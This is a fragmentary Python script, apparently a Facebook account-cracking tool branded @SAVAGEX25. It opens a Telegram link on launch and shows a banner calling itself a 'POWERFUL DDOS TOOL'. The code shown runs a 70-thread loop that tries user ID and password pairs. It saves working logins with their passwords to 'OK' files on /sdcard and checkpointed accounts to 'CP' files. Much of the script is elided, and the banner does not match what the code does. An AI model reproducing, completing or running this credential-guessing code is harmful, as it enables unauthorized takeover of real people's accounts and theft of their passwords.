...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/@SAVAGEX25Forid')
import os
...
os.system('espeak -a 300 " Welcome to the @SAVAGEX25 Tools,"')
...
{Fore.RED}┏┓┏┓┓┏┏┓┏┓┏┓
{Fore.LIGHTRED_EX}┗┓┣┫┃┃┣┫┃┓┣ 
{Fore.WHITE}┗┛┛┗┗┛┛┗┗┛┗┛  {Fore.YELLOW}# TG:- @SAVAGEX25 {Fore.LIGHTYELLOW_EX}POWERFUL DDOS TOOL #{Fore.RESET}"""
...
def xxr():
    ...
    with ThreadPool(max_workers=70) as manshera:
        ...
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[38;5;46mThe @SAVAGEX25')
        print('\033[38;5;46m══════════════════════════════════')
...
#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-Md Forid))            
    ...
    'dpr': '2',
    'sec-ch-prefers-color-scheme': '@SAVAGEX25',
...
\033[38;5;46m❴\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46m𝘽𝙊𝙎𝙎 𝙀𝙈𝙍𝘼𝙉\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●❵
\033[38;5;46m┌════════════════════════════════════════════┐          
\033[33;1m     The @SAVAGEX25𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙉𝙐𝙈𝘽𝙀𝙍❵\033[38;5;46m: {uid} 
\033[38;5;46m└════════════════════════════════════════════┘
\033[38;5;46m┌════════════════════════════════════════════┐
\033[33;1m     The @SAVAGEX25𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[38;5;46m❴𝙋𝘼𝙎𝙎𝙒𝙊𝙍𝘿❵ \033[38;5;46m: {ps}
\033[38;5;46m└════════════════════════════════════════════┘
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/The @SAVAGEX25-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
\033[38;5;46m└════════════════════════════════════════════┘
""")
                open('/sdcard/\033[38;5;46mThe @SAVAGEX25-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['@SAVAGEX25','@SAVAGEX25 ','@SAVAGEX25 '])
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}The @SAVAGEX25\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m@SAVAGEX25💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()